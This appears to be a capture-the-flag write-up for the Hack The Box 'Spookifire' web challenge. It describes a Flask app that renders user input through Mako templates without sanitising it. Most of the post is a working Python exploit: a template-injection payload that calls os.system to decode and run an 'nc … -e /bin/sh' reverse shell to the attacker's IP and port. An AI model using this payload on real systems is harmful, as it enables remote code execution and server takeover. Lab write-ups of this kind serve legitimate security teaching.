---
title: Spookifire
date: 2023-12-09 15:53:16 +0800
categories: [Hackthebox-Challenges, spookifire]
tags: [htb, ctf, pentesting, web, code-auditing]
---


<img src="../../assets/global/banner.png" alt="banner image">

## Spookifire is a python flask chalenge on Hackthebox

### Description:

Simply this challenge takes user input a print it different fornts
but the problem is it doesn't do any sanitizing and it passes the payload to Mako tamplete Engine to be rendered.

### Source code:
<a href='https://mega.nz/file/OexhiY5B#Q_Zv1UmJpz6XH365b_XSArulT7LUWtLQWZ3etvwLu5w'>Download source code</a>

*zip password: `hackthebox`*

### Vulnerable code:
```python
from mako.template import Template
```

```html
    <tbody>
        ${output}
    </tbody>

```

### Solve:

```python

import base64
import requests
import argparse
 
 

def solve(revshell_ip, revshell_port):
	url = 'http://localhost:1337/'

	rev = f"nc {revshell_ip} {revshell_port} -e /bin/sh"	
	payload = base64.b64encode(rev.encode('utf-8'))
	params = {
		'text': '${self.module.runtime.util.os.system("echo ' + str(payload, "utf-8") + ' | base64 -d| sh")}'
	}
 
	print('\n')
	print(params)
	print('\n')
	try:
		response = requests.get(url, params=params)
		if response.status_code == 200:
			print("Request successful!")
			# print("Response:", response.text)
		else:
			print(f"Request failed with status code: {response.status_code}")
	except requests.RequestException as e:
		print(f"Request failed: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Enter your ip and port to get reverse shell.')
    parser.add_argument('ip', type=str, help='ip to get reverse shell')
    parser.add_argument('port', type=str, help='port to get reverse shell')
    args = parser.parse_args()
    solve(args.ip, args.port)

```







